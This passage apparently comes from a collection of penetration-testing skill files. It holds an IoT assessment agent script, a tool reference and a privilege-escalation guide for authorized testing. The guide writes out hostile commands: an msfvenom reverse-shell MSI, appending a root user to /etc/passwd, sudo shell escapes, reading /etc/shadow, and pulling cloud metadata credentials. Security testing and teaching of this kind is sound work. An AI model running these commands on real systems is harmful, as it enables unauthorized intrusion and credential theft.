- /etc/shadow contains hardcoded root password (camera123) shared across all units
- WiFi credentials for any configured network stored in plaintext at /etc/wireless.conf
- RTSP stream accessible without authentication on port 554

**Impact**:
Physical access to any deployed camera grants root access to the network.
With 200 cameras deployed across offices, each camera becomes a potential
network entry point with root-level command execution capability.

**Remediation**:
1. Disable UART console access or require authentication in production firmware
2. Remove hardcoded credentials; use per-device unique passwords generated at manufacture
3. Encrypt stored WiFi credentials using a hardware-backed key
4. Deploy cameras on an isolated VLAN with no access to the corporate network
```

===== END FILE =====


===== FILE: skills/performing-iot-security-assessment/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-iot-security-assessment/references/api-reference.md =====
# API Reference: IoT Security Assessment

## Tools CLI Reference

| Tool | Command | Description |
|------|---------|-------------|
| nmap | `nmap -sV -sC -p- <target>` | Full port scan with version detection |
| binwalk | `binwalk -eM <firmware>` | Recursive firmware extraction |
| tcpdump | `tcpdump -i <iface> host <ip> -w <pcap>` | Packet capture from device |
| openssl | `openssl s_client -connect <ip>:<port>` | TLS certificate inspection |
| flashrom | `flashrom -p ch341a_spi -r <output>` | SPI flash memory dump |

## Firmwalker (Firmware Scanner)

```bash
./firmwalker.sh <extracted_fs_root>/
# Scans for: passwords, keys, URLs, IPs, emails, config files
```

## FirmAE / Firmadyne (Firmware Emulation)

```bash
python3 fat.py <firmware.bin>
# Boots extracted Linux firmware in QEMU for dynamic testing
```

## Python Libraries

| Library | Version | Purpose |
|---------|---------|---------|
| `subprocess` | stdlib | Execute nmap, binwalk, tcpdump commands |
| `hashlib` | stdlib | Firmware integrity hashing |
| `paho-mqtt` | >=1.6 | MQTT protocol testing for unauthenticated access |

## Common IoT Protocols & Ports

| Protocol | Port | Security Concern |
|----------|------|-----------------|
| MQTT | 1883/8883 | Often unauthenticated, subscribe to # |
| CoAP | 5683 | UDP-based, usually no authentication |
| UPnP | 1900 | Service discovery, often exposes admin |
| RTSP | 554 | Video streams, frequently unauthenticated |
| Telnet | 23 | Plaintext credentials |

## References

- OWASP IoT Top 10: https://owasp.org/www-project-internet-of-things/
- FCC ID lookup: https://www.fcc.gov/oet/ea/fccid
- Firmadyne: https://github.com/firmadyne/firmadyne
- Binwalk: https://github.com/ReFirmLabs/binwalk

===== END FILE =====


===== FILE: skills/performing-iot-security-assessment/scripts/agent.py =====
#!/usr/bin/env python3
"""Agent for performing IoT security assessment.

Automates IoT device reconnaissance, firmware extraction with binwalk,
network traffic analysis, and service scanning for security testing.
"""

import subprocess
import json
import sys
import hashlib
from pathlib import Path


class IoTSecurityAgent:
    """Performs automated IoT device security assessments."""

    def __init__(self, target_ip, output_dir):
        self.target_ip = target_ip
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)

    def scan_services(self):
        """Scan target for open services using nmap."""
        result = subprocess.run(
            ["nmap", "-sV", "-sC", "-p-", "-oJ", "-", self.target_ip],
            capture_output=True, text=True, timeout=300,
        )
        services = []
        for line in result.stdout.splitlines():
            if "/tcp" in line or "/udp" in line:
                parts = line.split()
                if len(parts) >= 3:
                    services.append({
                        "port": parts[0],
                        "state": parts[1],
                        "service": " ".join(parts[2:]),
                    })
        return {"target": self.target_ip, "services": services, "raw": result.stdout}

    def check_default_credentials(self):
        """Test common default credentials against discovered services."""
        default_creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
            ("root", "root"), ("root", "admin"), ("root", "password"),
            ("admin", ""), ("user", "user"), ("guest", "guest"),
        ]
        results = []
        for username, password in default_creds:
            result = subprocess.run(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                 "-u", f"{username}:{password}",
                 f"http://{self.target_ip}/", "--max-time", "5"],
                capture_output=True, text=True,
                timeout=120,
            )
            status = result.stdout.strip()
            if status in ("200", "301", "302"):
                results.append({
                    "username": username,
                    "password": password,
                    "status": status,
                    "vulnerable": True,
                })
        return results

    def analyze_firmware(self, firmware_path):
        """Analyze firmware image with binwalk."""
        fw_path = Path(firmware_path)
        if not fw_path.exists():
            return {"error": f"Firmware file not found: {firmware_path}"}

        sha256 = hashlib.sha256(fw_path.read_bytes()).hexdigest()
        scan_result = subprocess.run(
            ["binwalk", str(fw_path)], capture_output=True, text=True,
            timeout=120,
        )
        extract_dir = self.output_dir / "firmware_extracted"
        subprocess.run(
            ["binwalk", "-eM", "-C", str(extract_dir), str(fw_path)],
            capture_output=True, text=True,
            timeout=120,
        )

        creds_found = []
        for root, dirs, files in (extract_dir).rglob("*") if extract_dir.exists() else []:
            pass

        if extract_dir.exists():
            grep_result = subprocess.run(
                ["grep", "-rn", "-i", "password\\|passwd\\|secret",
                 str(extract_dir)],
                capture_output=True, text=True,
                timeout=120,
            )
            for line in grep_result.stdout.splitlines()[:20]:
                creds_found.append(line.strip())

        return {
            "sha256": sha256,
            "size": fw_path.stat().st_size,
            "binwalk_scan": scan_result.stdout,
            "credentials_found": creds_found,
            "extract_dir": str(extract_dir),
        }

    def capture_traffic(self, interface="eth0", duration=30):
        """Capture network traffic from the IoT device."""
        pcap_path = self.output_dir / "iot_capture.pcap"
        subprocess.run(
            ["timeout", str(duration), "tcpdump", "-i", interface,
             f"host {self.target_ip}", "-w", str(pcap_path)],
            capture_output=True, timeout=duration + 10,
        )
        if pcap_path.exists():
            stats = subprocess.run(
                ["capinfos", str(pcap_path)], capture_output=True, text=True,
                timeout=120,
            )
            return {"pcap": str(pcap_path), "stats": stats.stdout}
        return {"error": "Capture failed"}

    def check_tls_configuration(self, port=443):
        """Check TLS configuration on HTTPS services."""
        result = subprocess.run(
            ["openssl", "s_client", "-connect", f"{self.target_ip}:{port}",
             "-brief"],
            input="", capture_output=True, text=True, timeout=10,
        )
        tls_info = {
            "raw": result.stdout + result.stderr,
            "self_signed": "self signed" in (result.stdout + result.stderr).lower(),
        }

        for line in (result.stdout + result.stderr).splitlines():
            if "Protocol" in line:
                tls_info["protocol"] = line.strip()
            if "Cipher" in line:
                tls_info["cipher"] = line.strip()
        return tls_info

    def check_upnp_exposure(self):
        """Check for UPnP service exposure."""
        result = subprocess.run(
            ["nmap", "-sU", "-p", "1900", "--script=upnp-info", self.target_ip],
            capture_output=True, text=True, timeout=30,
        )
        return {
            "upnp_detected": "upnp" in result.stdout.lower(),
            "output": result.stdout,
        }

    def check_mqtt(self, port=1883):
        """Check for unauthenticated MQTT access."""
        try:
            import paho.mqtt.client as mqtt
            connected = False
            topics = []

            def on_connect(client, userdata, flags, rc):
                nonlocal connected
                connected = rc == 0
                if connected:
                    client.subscribe("#")

            def on_message(client, userdata, msg):
                topics.append({"topic": msg.topic, "payload_len": len(msg.payload)})

            client = mqtt.Client()
            client.on_connect = on_connect
            client.on_message = on_message
            client.connect(self.target_ip, port, 5)
            client.loop_start()
            import time
            time.sleep(5)
            client.loop_stop()
            client.disconnect()

            return {
                "unauthenticated_access": connected,
                "topics_found": len(topics),
                "sample_topics": topics[:10],
            }
        except Exception as e:
            return {"error": str(e)}

    def generate_report(self, firmware_path=None):
        """Run full IoT security assessment and generate report."""
        report = {"target": self.target_ip, "findings": []}

        services = self.scan_services()
        report["services"] = services

        creds = self.check_default_credentials()
        if creds:
            report["findings"].append({
                "id": "IOT-001", "severity": "Critical",
                "title": "Default Credentials Accepted",
                "details": creds,
            })

        tls = self.check_tls_configuration()
        if tls.get("self_signed"):
            report["findings"].append({
                "id": "IOT-002", "severity": "Medium",
                "title": "Self-Signed TLS Certificate",
                "details": tls,
            })

        if firmware_path:
            fw = self.analyze_firmware(firmware_path)
            report["firmware_analysis"] = fw
            if fw.get("credentials_found"):
                report["findings"].append({
                    "id": "IOT-003", "severity": "Critical",
                    "title": "Hardcoded Credentials in Firmware",
                    "count": len(fw["credentials_found"]),
                })

        report_path = self.output_dir / "iot_assessment_report.json"
        with open(report_path, "w") as f:
            json.dump(report, f, indent=2)
        print(json.dumps(report, indent=2))
        return report


def main():
    if len(sys.argv) < 3:
        print("Usage: agent.py <target_ip> <output_dir> [firmware_path]")
        sys.exit(1)

    target_ip = sys.argv[1]
    output_dir = sys.argv[2]
    firmware_path = sys.argv[3] if len(sys.argv) > 3 else None

    agent = IoTSecurityAgent(target_ip, output_dir)
    agent.generate_report(firmware_path)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-privilege-escalation-assessment/SKILL.md =====
---
name: performing-privilege-escalation-assessment
description: 'Performs privilege escalation assessments on compromised Linux and Windows
  systems to identify paths from low-privilege access to root or SYSTEM-level control.
  The tester enumerates misconfigurations, vulnerable services, kernel exploits, SUID
  binaries, unquoted service paths, and credential stores to demonstrate the full
  impact of an initial compromise. Activates for requests involving privilege escalation
  testing, local exploitation, post-compromise escalation, or OS-level security assessment.

  '
domain: cybersecurity
subdomain: penetration-testing
tags:
- privilege-escalation
- post-exploitation
- Linux-privesc
- Windows-privesc
- local-exploitation
version: 1.0.0
author: mahipal
license: Apache-2.0
d3fend_techniques:
- Executable Denylisting
- Execution Isolation
- File Metadata Consistency Validation
- Restore Access
- Password Authentication
nist_csf:
- ID.RA-01
- ID.RA-06
- GV.OV-02
- DE.AE-07
mitre_attack:
- T1595
- T1190
- T1059
- T1078
- T1068
---
# Performing Privilege Escalation Assessment

## When to Use

- After gaining initial low-privilege access during a penetration test to demonstrate full system compromise
- Assessing the security hardening of Linux and Windows servers against local privilege escalation attacks
- Evaluating whether endpoint detection and response (EDR) tools detect common privilege escalation techniques
- Testing the effectiveness of least-privilege policies and application whitelisting on endpoints
- Validating that container breakout and VM escape controls are properly configured

**Do not use** without written authorization, against production systems where exploitation could cause downtime, or for deploying kernel exploits on systems without prior approval and rollback capability.

## Prerequisites

- Low-privilege shell access (reverse shell, SSH, RDP) to the target system obtained through authorized means
- Privilege escalation enumeration scripts: linPEAS (Linux), winPEAS (Windows), Linux Smart Enumeration (LSE)
- Compiled kernel exploits for common CVEs or access to compilation tools on the target
- GTFOBins reference for Linux SUID/sudo binary abuse and LOLBAS reference for Windows living-off-the-land binaries
- Precompiled post-exploitation binaries for the target architecture if compilation is not available on the target

## Workflow

### Step 1: System Enumeration

Gather comprehensive information about the target system:

**Linux Enumeration:**
- `id && whoami` - Current user and group memberships
- `uname -a` - Kernel version for kernel exploit identification
- `cat /etc/os-release` - Distribution and version
- `sudo -l` - Commands the current user can run as root via sudo
- `find / -perm -4000 -type f 2>/dev/null` - SUID binaries
- `find / -perm -2000 -type f 2>/dev/null` - SGID binaries
- `crontab -l && ls -la /etc/cron*` - Scheduled tasks running as root
- `ps aux | grep root` - Processes running as root
- `cat /etc/passwd` - User accounts (look for additional users with UID 0)
- `find / -writable -type d 2>/dev/null` - World-writable directories
- Run `linpeas.sh` for automated comprehensive enumeration

**Windows Enumeration:**
- `whoami /priv` - Current user privileges (look for SeImpersonatePrivilege, SeDebugPrivilege)
- `systeminfo` - OS version, hotfix level, architecture
- `wmic service get name,pathname,startmode` - Unquoted service paths
- `icacls "C:\Program Files" /T` - Writable directories in Program Files
- `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` - AlwaysInstallElevated check
- `cmdkey /list` - Stored Windows credentials
- `schtasks /query /fo LIST /v` - Scheduled tasks with their run-as accounts
- Run `winPEAS.exe` for automated comprehensive enumeration

### Step 2: Linux Privilege Escalation Vectors

Test identified escalation vectors systematically:

- **Sudo misconfigurations**: If `sudo -l` shows entries like `(ALL) NOPASSWD: /usr/bin/vim`, use GTFOBins to escalate:
  - `sudo vim -c ':!/bin/bash'` to spawn a root shell
  - Common dangerous sudo entries: vim, less, find, nmap, python, perl, ruby, awk, env
- **SUID binary abuse**: If a SUID binary is identified that allows arbitrary command execution, shell escape, or file read:
  - Custom SUID: Check if a custom SUID binary calls other programs without absolute paths (PATH injection)
  - Known SUID: Check GTFOBins for exploitation of standard SUID binaries
- **Cron job exploitation**: If a cron job runs a script writable by the current user, or runs a script from a writable directory:
  - Modify the script to add a reverse shell or SUID copy of bash
  - PATH-based cron exploitation: if the cron job calls a command without absolute path and PATH is writable
- **Kernel exploits**: Match the kernel version to known exploits:
  - DirtyPipe (CVE-2022-0847): Linux kernel 5.8-5.16.11
  - DirtyCow (CVE-2016-5195): Linux kernel 2.6.22-4.8.3
  - PwnKit (CVE-2021-4034): Polkit pkexec vulnerability affecting most Linux distributions
- **Capabilities abuse**: `getcap -r / 2>/dev/null` to find binaries with elevated capabilities (cap_setuid, cap_dac_override)
- **Writable /etc/passwd**: If /etc/passwd is writable, add a new root user: `echo 'newroot:$1$hash:0:0::/root:/bin/bash' >> /etc/passwd`

### Step 3: Windows Privilege Escalation Vectors

Test Windows-specific escalation paths:

- **Token impersonation**: If the user has `SeImpersonatePrivilege` (common for service accounts and IIS):
  - Use `JuicyPotato.exe`, `PrintSpoofer.exe`, or `GodPotato.exe` to impersonate SYSTEM
  - `PrintSpoofer.exe -i -c "cmd /c whoami"` -> `NT AUTHORITY\SYSTEM`
- **Unquoted service paths**: If a service has an unquoted path with spaces (e.g., `C:\Program Files\My App\service.exe`) and you can write to an intermediate directory:
  - Place a malicious executable at `C:\Program Files\My.exe` which will execute when the service restarts
- **Writable service binaries**: If you can modify the executable of a service running as SYSTEM:
  - Replace the binary with a reverse shell and restart the service
- **AlwaysInstallElevated**: If both HKLM and HKCU AlwaysInstallElevated registry keys are set to 1:
  - Generate a malicious MSI: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o shell.msi`
  - Install with elevated privileges: `msiexec /quiet /qn /i shell.msi`
- **Stored credentials**: Check for credentials in `cmdkey /list`, AutoLogon registry keys, unattend.xml, web.config files, and PowerShell history
- **DLL hijacking**: Identify services that load DLLs from writable directories. Use Process Monitor to find missing DLL loads, then place a malicious DLL.
- **Scheduled tasks**: Find tasks running as SYSTEM with writable scripts or binaries

### Step 4: Container and Cloud Escalation

Test for escalation paths in containerized and cloud environments:

- **Docker breakout**: Check if the container runs in privileged mode (`--privileged`), has the Docker socket mounted (`/var/run/docker.sock`), or has `SYS_ADMIN` capability
- **Kubernetes pod escalation**: Check for service account tokens with cluster-admin rights, hostPID/hostNetwork namespaces, or hostPath volume mounts
- **Cloud metadata**: Access cloud instance metadata from compromised hosts (`http://169.254.169.254/latest/meta-data/`) to discover IAM roles, credentials, and instance information
- **IAM role abuse**: If cloud credentials are discovered, enumerate IAM permissions and test for privilege escalation through IAM policy manipulation

### Step 5: Documentation and Impact Assessment

Document the complete escalation path and business impact:

- Record every command executed during escalation with timestamps
- Capture proof of elevated access (whoami showing root/SYSTEM, accessing restricted files)
- Document what data or systems become accessible at the elevated privilege level
- Map the escalation technique to MITRE ATT&CK (T1548 - Abuse Elevation Control Mechanism, T1068 - Exploitation for Privilege Escalation)
- Provide specific remediation for each identified escalation vector

## Key Concepts

| Term | Definition |
|------|------------|
| **SUID Binary** | A Linux binary with the Set User ID bit enabled, which executes with the file owner's privileges (typically root) regardless of who runs it |
| **SeImpersonatePrivilege** | A Windows privilege that allows a process to impersonate another user's security token, commonly abused by service accounts to escalate to SYSTEM |
| **Kernel Exploit** | An exploit targeting a vulnerability in the operating system kernel to gain ring-0 or root/SYSTEM-level access |
| **GTFOBins** | A curated list of Unix binaries that can be exploited for privilege escalation, file read/write, or shell escape when misconfigured |
| **LOLBAS** | Living Off The Land Binaries and Scripts; legitimate Windows binaries that can be abused for code execution, file operations, or persistence |
| **DLL Hijacking** | Exploiting the DLL search order on Windows to load a malicious DLL by placing it in a directory searched before the legitimate DLL location |
| **Token Impersonation** | A Windows technique where a compromised process with appropriate privileges captures and uses another user's access token to execute commands as that user |

## Tools & Systems

- **linPEAS / winPEAS**: Automated privilege escalation enumeration scripts that check hundreds of potential escalation vectors on Linux and Windows
- **GTFOBins / LOLBAS**: Reference databases of Unix binaries and Windows binaries that can be exploited for privilege escalation when misconfigured
- **PrintSpoofer / GodPotato**: Windows privilege escalation tools that exploit `SeImpersonatePrivilege` to achieve SYSTEM-level access from service accounts
- **Linux Exploit Suggester**: Script that compares the target kernel version against a database of known kernel exploits to identify applicable exploits

## Common Scenarios

### Scenario: Privilege Escalation on a Linux Web Server

**Context**: During a penetration test, the tester gained a low-privilege shell as `www-data` on an Ubuntu 22.04 web server through a PHP file upload vulnerability. The goal is to escalate to root to demonstrate full server compromise.

**Approach**:
1. Run `linpeas.sh` which identifies that `www-data` can run `/usr/bin/find` as root via sudo without a password
2. Verify with `sudo -l`: `(root) NOPASSWD: /usr/bin/find`
3. Consult GTFOBins for the `find` sudo entry: `sudo find . -exec /bin/bash -p \; -quit`
4. Execute the command and obtain a root shell
5. As root, access `/etc/shadow` to extract password hashes, read database credentials from the application configuration, and access the MySQL database containing customer PII
6. Document: initial access as www-data -> sudo misconfiguration -> root shell -> database access -> 75,000 customer records accessible

**Pitfalls**:
- Running kernel exploits without testing on a similar system first, risking a kernel panic and system crash
- Not checking for container environments where apparent root access may be limited to the container namespace
- Ignoring cloud metadata endpoints accessible from the compromised host that may yield IAM credentials
- Failing to enumerate capabilities and SUID binaries after checking sudo, missing alternative escalation paths

## Output Format

```
## Finding: Sudo Misconfiguration Allowing Root Escalation via find

**ID**: PRIV-001
**Severity**: Critical (CVSS 8.8)
**Affected Host**: web-prod-01 (10.10.5.15)
**OS**: Ubuntu 22.04 LTS
**Initial Access**: www-data (via PHP file upload - WEB-004)
**Escalation Technique**: MITRE ATT&CK T1548.003 - Sudo and Sudo Caching

**Description**:
The www-data user is configured in /etc/sudoers to execute /usr/bin/find as root
without a password. The find command supports the -exec flag which can spawn a
root shell, effectively granting www-data unrestricted root access.

**Proof of Concept**:
www-data@web-prod-01:~$ sudo -l
(root) NOPASSWD: /usr/bin/find
www-data@web-prod-01:~$ sudo find . -exec /bin/bash -p \; -quit
root@web-prod-01:~# id
uid=0(root) gid=0(root) groups=0(root)

**Impact**:
Full root access on the production web server. From root, the tester accessed
database credentials in /var/www/app/.env, connected to MySQL, and confirmed
read access to 75,000 customer records including names, emails, and addresses.

**Remediation**:
1. Remove the /usr/bin/find sudo entry for www-data
2. If find access is required, restrict it to specific directories with --no-exec
3. Audit all sudo entries for binaries listed in GTFOBins
4. Implement sudo logging with auditd for all privileged command execution
```

===== END FILE =====


===== FILE: skills/performing-privilege-escalation-assessment/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
